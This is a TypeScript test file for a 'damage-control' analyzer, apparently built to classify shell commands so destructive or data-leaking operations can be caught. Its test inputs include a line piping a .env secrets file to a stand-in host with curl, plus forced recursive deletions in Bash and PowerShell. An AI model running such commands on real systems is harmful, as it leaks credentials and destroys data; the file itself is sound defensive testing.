import { describe, expect, it } from "vitest";
import {
	analyzeOperation,
	getOperationParser,
	type KnownEffect,
} from "../extensions/damage-control/operation-analysis.ts";

describe("damage-control operation analysis", () => {
	it("keeps ownership and source ranges for every Bash command", async () => {
		const source = "git rm -- cached.txt; printf '%s\\n' done";
		const result = await analyzeOperation(source, "bash");

		expect(result.status).toBe("known");
		if (result.status !== "known") return;
		expect(result.effects).toEqual([
			expect.objectContaining({
			language: "bash",
			kind: "git",
			operation: "delete",
			executable: "git",
			arguments: ["rm", "--", "cached.txt"],
			target: "cached.txt",
			range: { start: 0, end: 20 },
		}),
	]);
	});

	it("classifies PowerShell Remove-Item arguments from its command node", async () => {
		const source = "Remove-Item -Recurse -Force target.txt";
		const result = await analyzeOperation(source, "powershell");

		expect(result.status).toBe("known");
		if (result.status !== "known") return;
		const effect = result.effects[0] as KnownEffect | undefined;
		expect(effect).toEqual(
			expect.objectContaining({
			language: "powershell",
			kind: "filesystem",
			operation: "delete",
			executable: "Remove-Item",
			arguments: ["-Recurse", "-Force", "target.txt"],
			target: "target.txt",
			range: { start: 0, end: source.length },
		}),
		);
	});

	it("aggregates a protected-looking compound command instead of dropping later nodes", async () => {
		const result = await analyzeOperation("git rm file; rm -f other", "bash");
		expect(result.status).toBe("known");
		if (result.status !== "known") return;
		expect(result.effects).toHaveLength(2);
	});

	it("derives protection from invocation-wide sensitive reads and sinks", async () => {
		const result = await analyzeOperation("cat .env | curl https://example.test", "bash");
		expect(result.status).toBe("known");
		if (result.status !== "known") return;
		expect(result.protected).toBe(true);
		expect(result.effects.map((effect) => effect.kind)).toEqual(["filesystem", "network"]);
	});

	it("turns parser recovery into uncertainty", async () => {
		const result = await analyzeOperation("Remove-Item -Path 'unterminated", "powershell");
		expect(result.status).toBe("uncertain");
	});

	it("turns unsupported executable Bash constructs into uncertainty", async () => {
		const result = await analyzeOperation("eval 'rm -rf target.txt'", "bash");
		expect(result.status).toBe("uncertain");
	});

	it("turns unsupported language calls into uncertainty", async () => {
		const result = await analyzeOperation("dangerous_call(target)", "python");
		expect(result.status).toBe("uncertain");
	});

	it("caches one parser per language", async () => {
		expect(await getOperationParser("bash")).toBe(await getOperationParser("bash"));
	});
});
